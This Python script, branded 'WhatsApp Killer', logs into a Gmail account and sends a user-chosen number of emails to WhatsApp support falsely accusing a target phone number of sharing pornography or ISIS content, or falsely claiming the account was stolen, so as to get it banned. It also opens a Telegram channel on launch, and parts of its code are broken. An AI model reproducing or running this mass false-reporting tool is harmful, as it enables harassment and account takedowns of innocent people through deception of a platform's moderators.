from os import system , name
system('pip install smtplib')
system('pip install datetime')
system('pip install colorama')
system('pip install getpass')
system('xdg-open https://t.me/NullCyberi')
import smtplib
from sys import exit
from email.message import EmailMessage
from datetime import datetime
from colorama import Fore
from time import sleep
from random import choice
red = Fore.RED
green = Fore.GREEN
white = Fore.WHITE
cyan = Fore.CYAN
blue = Fore.BLUE
yellow = Fore.YELLOW
lightgreen = Fore.LIGHTGREEN_EX
if name == 'nt':
	system('cls')
else:
	system('clear')
def SlowPrint(txt):
    for x in txt:
        print(x, end='', flush=True)
        sleep(0.1)
    print()
print(f'''

{green}__      ___         _                       {red} __   __   __         ______     _____  
{green}\ \    / / |_  __ _| |_ ___ __ _ _ __ _ __  {red}/\ \ / /  /\ \       /\  ___\   /\  __-.  
{green} \ \/\/ /| ' \/ _` |  _(_-</ _` | '_ \ '_ \ {red}\ \ \' /  \ \ \____  \ \  __\   \ \ \/\ \ 
{green}  \_/\_/ |_||_\__,_|\__/__/\__,_| .__/ .__/ {red} \ \__/    \ \_____\  \ \_____\  \ \____-
{green}                                |_|  |_|    {red}  \/_/      \/_____\   \ /_____/   \/____/ 

{blue}[!]{yellow} By Soorya Puthran
{blue}[!]{yellow} Version 2.1
''')
sleep(0.1)
mail = input(f'''{red}┌─[{green}WHATSAPP-KILLER{blue}~{white}@YOUR-EMAIL{red}]
└──╼{white} 卍 ''')
passwd = input(f'''{red}┌─[{green}WHATSAPP-KILLER{blue}~{white}@PASSWORD{red}]
└──╼{white} 卍 ''')
target = input(f'''{red}┌─[{green}WHATSAPP-KILLER{blue}~{white}@TARGET-NUMBER{red}]
└──╼{white} 卍 ''')
count = input(f'''{red}┌─[{green}WHATSAPP-KILLER{blue}~{white}@REPORT-COUNT{red}]
└──╼{white} 卍 ''')
sleep(0.9)
print('''

[1] - ban whatsapp 1
[2] - ban whatsapp 2

''')
report_type = input(f'''{red}┌─[{green}WHATSAPP-KILLER{blue}~{white}@REPORT-TYPE{red}]
└──╼{white} 卍 ''')
msg1 = ('this user is sharing immoral content & pornographic videos , please ban it as soon as possible , phone number :'+white+str(target))
msg2 = ('This user shares ISIS beliefs & many horrible videos of killing the humans , please ban it as soon as possible , phone number :'+white+str(target))
msg3 = ('this user is sharing people personal information & data in chats amd groups, please ban it as soon as possible, phone number is :'+white+str(target))
msg4 = ('Desative este número|Estou solicitando a desativação temporária da minha conta no whatsapp,meu numero:'+white+str(target))
msg5 = (f''''
This number ( {target} ) account has been stolen. I want to go into my WhatsApp account , but the SIM card is not in front of me to get the code number and enter my account , Please help me. I had many friends and acquaintances in this account. Please return my account as soon as possible

Thank you''')
msg_stolen = ['msg5']
msg_immoral = [msg1,msg2,msg3,msg4,]
sleep(10.5)
SlowPrint(f'{lightgreen}\n[!] Starting ..........\n')
try:
    email = EmailMessage()
    email['from'] = mail
    email['to'] = 'support@support.whatsapp.com'
    if report_type == '1':
        email['subject'] = 'Immoral Actions Report'
    elif report_type == '2':
    	email['subject'] = 'Stolen Account Report'
    if report_type == '1':
        email.set_content(choice(msg_immoral))
    elif report_type == '2':
    	email.set_content(choice(msg_stolen))
    else:
    	email.set_content(choice(msg))
    with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login(mail,passwd)
        for i in range(1,int(count)+1):
            now = datetime.now()
            Current_time = now.strftime('%H:%M:%S')
            smtp.send_message(email)
            print(f'{cyan}[{Current_time}] {white}WhatsApp Killer Report Result : {green}True')
except KeyboardInterrupt:
    print(f'{red}[-] {white}Opration Canceled By User')
    exit()
except smtplib.SMTPAuthenticationError:
    print (f'{red}[!] {white}The gmail account address or password you entered is incorrect.')
    exit()
except:
    print(f'{cyan}[{Current_time}] {white}WhatsApp Killer Report Result : {red}False')
